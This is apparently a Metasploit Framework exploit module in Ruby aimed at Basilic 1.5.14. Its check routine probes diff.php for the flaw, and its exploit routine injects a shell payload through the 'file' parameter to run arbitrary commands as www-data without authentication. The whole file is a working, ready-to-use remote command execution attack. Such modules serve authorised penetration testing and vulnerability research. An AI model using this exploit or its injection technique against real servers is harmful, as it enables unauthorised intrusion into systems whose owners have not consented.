# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Basilic 1.5.14 diff.php Arbitrary Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module abuses a metacharacter injection vulnerability in the
                diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary
                commands as the www-data user account.
            },
            &#039;Author&#039;         =>
                [
                    &#039;lcashdollar&#039;,
                    &#039;sinn3r&#039;,
                    &#039;juan&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;54234&#039; ]
                ],
            &#039;Platform&#039;       => [&#039;linux&#039;, &#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl ruby bash telnet&#039;
                        }
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic Target&#039;, { }]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 28 2012&#039;
        ))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Basilic&#039;, &#039;/basilic-1.5.14/&#039;])
            ], self.class)
    end
 
 
    def check
        base = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
 
        sig = rand_text_alpha(10)
 
        res = send_request_cgi({
            &#039;uri&#039;  => "/#{base}/Config/diff.php",
            &#039;vars_get&#039; => {
                &#039;file&#039; => sig,
                &#039;new&#039;  => &#039;1&#039;,
                &#039;old&#039;  => &#039;2&#039;
            }
        })
 
        if res and res.body =~ /#{sig}/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def exploit
        print_status("Sending GET request...")
 
        base = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
 
        res = send_request_cgi({
                &#039;uri&#039; => "/#{base}/Config/diff.php",
                &#039;vars_get&#039; => {
                    &#039;file&#039; => "&#{payload.encoded} #",
                    &#039;new&#039;  => &#039;1&#039;,
                    &#039;old&#039;  => &#039;2&#039;
                }
            })
 
        if res and res.code == 404 then
            print_error("404 Basilic not installed or possibly check URI Path.")
        else
            vprint_line(res.body) if res
        end
 
        handler
    end
end



